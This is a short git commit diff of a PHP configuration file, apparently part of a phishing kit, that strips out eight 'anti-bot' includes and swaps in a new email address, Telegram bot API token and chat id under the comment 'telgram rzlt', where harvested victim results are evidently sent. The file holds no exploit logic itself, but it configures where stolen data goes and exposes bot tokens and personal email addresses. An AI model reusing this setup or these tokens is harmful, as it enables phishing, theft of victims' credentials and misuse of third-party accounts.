896c6a30bf432f3ad46d675976835e2d3aab379f
Jarisjida <jaris.jida@gmail.com>
2024-07-09 15:30:49 +0100

    Update emaildzbi.php

--- emaildzbi.php
+++ emaildzbi.php
@@ -1,19 +1,11 @@
 <?php
 
-include '../bots/anti1.php';
-include '../bots/anti2.php';
-include '../bots/anti3.php';
-include '../bots/anti4.php';
-include '../bots/anti5.php';
-include '../bots/anti6.php';
-include '../bots/anti7.php';
-include '../bots/anti8.php';
 
-$email ="skrillpom@yahoo.com"; 
+$email ="jaris.jida@gmail.com"; 
 
 //telgram rzlt
-$api = "5162513452:AAGprz7E6jhixYh_Og8QDc9p7HuGAM7h17E";
-$chatid = "862486231";
+$api = "6411069381:AAF0yhHVokDqyCPyDWtTo27BWYcEbDbDWhM";
+$chatid = "6586877449";
 
 
 ?>
